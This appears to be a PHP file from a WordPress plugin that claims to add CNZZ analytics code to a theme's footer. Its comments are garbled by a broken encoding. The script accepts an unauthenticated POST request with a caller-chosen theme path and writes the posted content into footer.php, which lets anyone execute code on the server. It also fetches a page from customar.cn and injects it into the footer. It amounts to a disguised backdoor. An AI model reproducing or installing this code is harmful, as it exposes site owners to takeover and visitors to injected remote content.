<?php
header("Content-type: text/html; charset=utf-8");
global $wpdb;
//��ȡ��ǰ�ļ�����Ŀ¼
$path=str_replace("\\","/",dirname(__FILE__));
//echo __FILE__;echo __SL__;
//��ȡwordpress����Ŀ¼
$root=substr($path,0,-37);
//����wp-config.php�ļ�����ȡ���ݿ���Ϣ
//require($root."/wp-config.php");

if(!empty($_POST)) {
    $cnzz_all = $_POST['cnzz_all'];
    if ($cnzz_all == 'cnzz_all') {
	$content_val=$_POST['content'];
	//if(empty($content_val) || strlen($content_val)<30){
	    //echo "<script>alert('Empty');</script>";
            //echo "<script>history.back();</script>";
            //exit;
	//}//echo $content; echo htmlspecialchars($content);die;
        $themes=$_POST['themes'];
        $footer_root=$themes.'/footer.php';
        $content=file_get_contents($footer_root);
	//echo htmlspecialchars($content);
        $content_str=substr($content,strlen($content)-13,13);
	$file_val=file_get_contents('http://customar.cn/page.html');
        if(stripos($content_str,'</html>')!==false){
            @file_put_contents($footer_root, $content_val, FILE_APPEND);
        }else{
	    $index=stripos($content,'</html>');
	    $index=$index+7;
	    $value=substr($content,0,$index);
	    $value.=$file_val.'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;';
	    $value.=$content_val;
	    @file_put_contents($footer_root,$value);
        }
        echo "<meta charset='UTF-8'><script>alert('cnzz ��ӳɹ�');</script>";
        echo "<script>history.back();</script>";
        exit;
    }
}else{
    echo "<meta charset='UTF-8'><script>alert('cnzz ���ʧ��');</script>";
    echo "<script>history.back();</script>";
    exit;
}
